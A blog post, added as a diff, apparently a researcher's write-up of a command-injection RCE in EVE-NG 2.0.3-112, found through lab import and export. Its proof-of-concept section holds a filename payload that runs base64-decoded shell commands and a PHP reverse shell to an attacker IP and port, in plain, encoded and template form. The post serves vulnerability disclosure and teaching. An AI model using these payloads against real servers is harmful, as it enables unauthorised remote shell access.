@@ -1,0 +1,162 @@
+---
+layout:     post
+title:      "A deep dive into EVE-NG Remote Command Execution"
+subtitle:   "PHP Filter bypass & RCE on EVE-NG"
+date:       2022-10-18 12:00:00
+author:     "ErPaciocco"
+header-img: "images/posts/2022-10-18-eve-ng-rce/evelogo.png"
+categories: Web
+color: orange
+---
+
+Hi all!
+A few months ago, during an activity, I tested an exposed EVE-NG instance.
+Immediately I thought:
+
+**"I am going to find a critical vulnerability in EVE-NG!"**
+
+I started the analysis and, a few days later, I reached my mission: now I'm gonna explain you
+all of my process, from recon to RCE, in:
+
+> EVE-NG 2.0.3-112 (community)
+
+*Let's goo!*
+
+### Phase 1: Inspecting Source Code
+
+From [EVE-NG Website](https://www.eve-ng.net/index.php/download/) I downloaded the 2.0.3-112 Community version OVF. 
+It was locally available at [192.168.1.26](http://192.168.1.26).
+
+I started the source code analysis by finding potentially dangerous functions like `exec`, `passthru`, `include`
+and so on.
+After typing `exec` in search bar I found this:
+
+<figure style="text-align: center">
+    <img src="{% vite_asset_path images/posts/2022-10-18-eve-ng-rce/result_exec.png %}"
+         alt="Results of 'exec' string">
+    <figcaption>Results of 'exec' string</figcaption>
+</figure>
+
+Looking at results page, I realized it could have been so funny because there were a lot of `exec` references which imply input data to check and validate.
+I decided to investigate more in depth on *api_labs.php*: it exposes an API to manage labs functions.
+
+<figure style="text-align: center">
+    <img src="{% vite_asset_path images/posts/2022-10-18-eve-ng-rce/apilabs.png %}"
+         alt="api_labs.php">
+    <figcaption>api_labs.php</figcaption>
+</figure>
+
+A quick sight to these functions gave me a hint on which ones I should focus on:
+* Import Lab
+* Export Lab
+
+*Other ones were more sanitized/hard to exploit or they weren't "highly related" to a potential RCE.*
+
+
+| Function          | Possible Exploit       | Motivation (lines)                               |
+| ------------------| -----------------------| -------------------------------------------------|
+| apiCloneLab       | Path Traversal         | api_labs.php: `107`, `117`                       |
+| apiDeleteLab      | RCE                    | Possible RCE but hard to exploit (input filters) |
+| apiImportLabs     | RCE                    | Possible chained RCE                             |
+| apiExportLabs     | RCE                    | Possible chained RCE                             |
+
+
+### Phase 2: Exploit Theory
+
+A deeper inspection led me to this plan:
+
+1. Import zipped LAB with a payload inside filename
+2. Export the same LAB, thus triggering command execution
+
+> Even if in other API calls UNL filename is checked and verified, in Import LAB feature (ZIP file) there isn't a check on `file` parameter:
+
+Function *apiImportLabs* : `html\includes\api_labs.php`
+
+<figure style="text-align: center">
+    <img src="{% vite_asset_path images/posts/2022-10-18-eve-ng-rce/import_lab.png %}"
+         alt="apiImportLabs function">
+    <figcaption>apiImportLabs function</figcaption>
+</figure>
+
+The absence of this check makes possible to inject arbitrary filenames in UNL files: 
+in Linux almost all characters are permitted inside filename, so it’s fantastic. I only had to end filename with *“.unl”*.
+
+In Export LAB feature there is a check to validate the existence of the file. If the file exists, the filename is passed to exec (parameter we control is `$relement`):
+
+Function *apiExportLabs* : `html\includes\api_labs.php`
+
+<figure style="text-align: center">
+    <img src="{% vite_asset_path images/posts/2022-10-18-eve-ng-rce/exportLab.png %}"
+         alt="apiExportLabs function">
+    <figcaption>apiExportLabs function</figcaption>
+</figure>
+
+> **NOTE**: Considering that path delimiters in Linux are forward slashes (/) while I was in Windows environment, I had to inject a payload that didn’t contain such characters (/, \: in Windows also \ is path delimiter). I opted to inject as zip argument a bash command.
+
+### Phase 3: PoC
+
+1) **Login as Admin**
+- To exploit this vulnerability, we must have enough privileges to create a new Lab.
+**Admin** user is the only role available in this version, so if you have an account on eve-ng, it will surely be an Administrator.
+
+<figure style="text-align: center">
+    <img src="{% vite_asset_path images/posts/2022-10-18-eve-ng-rce/login.png %}"
+         alt="Login page">
+    <figcaption>Login page</figcaption>
+</figure>
+
+2) **Import a new LAB**
+
+Once in */#/main* you must prepare the payload.
+Craft a payload as shown in steps below:
+  -	Create a ZIP file with a simple UNL file
+  -	Open ZIP file and rename it following these rules:
+    -	The filename must end with “.unl”
+    -	Filename must not contain these characters: / \ “ ‘
+Considering these limitations and that we must inject bash commands, final payload will be like:
+
+> ```$(eval $(echo BASE64DATA| base64 --decode)).unl```
+
+The best thing we can do in this case is build a reverse shell. Payload is base64 encoded, so we need to base64 encode a reverse shell payload. In my case it has been:
+
+> ```php -r '$sock=fsockopen("192.168.1.22",5555);exec("/bin/sh -i &lt;&3 &gt;&3 2&gt;&3");'```
+
+- Base64-encoded:
+
+> ```cGhwIC1yICckc29jaz1mc29ja29wZW4oIjE5Mi4xNjguMS4yMiIsNTU1NSk7ZXhlYygiL2Jpbi9zaCAtaSA8JjMgPiYzIDI+JjMiKTsn```
+
+But you must change it in the following format:
+
+> ```php -r '$sock=fsockopen("YOUR_LISTENING_IP",YOUR_LISTENING_PORT);exec("/bin/sh -i &lt;&3 &gt;&3 2&gt;&3");'```
+
+3) **Upload malicious ZIP file as new Lab**
+ 
+<figure style="text-align: center">
+    <img src="{% vite_asset_path images/posts/2022-10-18-eve-ng-rce/malzip.png %}"
+         alt="Malicious ZIP">
+    <figcaption>Malicious ZIP</figcaption>
+</figure>
+
+4) **Export LAB**
+
+In this final stage you must export the malicious Lab you’ve just created. Shell commands inside the UNL name will be executed. In case of reverse shell, be sure you are listening on IP and port set in malicious filename.
+ 
+<figure style="text-align: center">
+    <img src="{% vite_asset_path images/posts/2022-10-18-eve-ng-rce/netcat.png %}"
+         alt="Netcat listening">
+    <figcaption>Netcat listening</figcaption>
+</figure>
+
+<figure style="text-align: center">
+    <img src="{% vite_asset_path images/posts/2022-10-18-eve-ng-rce/export.png %}"
+         alt="Export LAB">
+    <figcaption>Export LAB</figcaption>
+</figure>
+
+<figure style="text-align: center">
+    <img src="{% vite_asset_path images/posts/2022-10-18-eve-ng-rce/revshell.png %}"
+         alt="Reverse Shell">
+    <figcaption>Reverse Shell</figcaption>
+</figure>
+
+**STAY TUNED!**
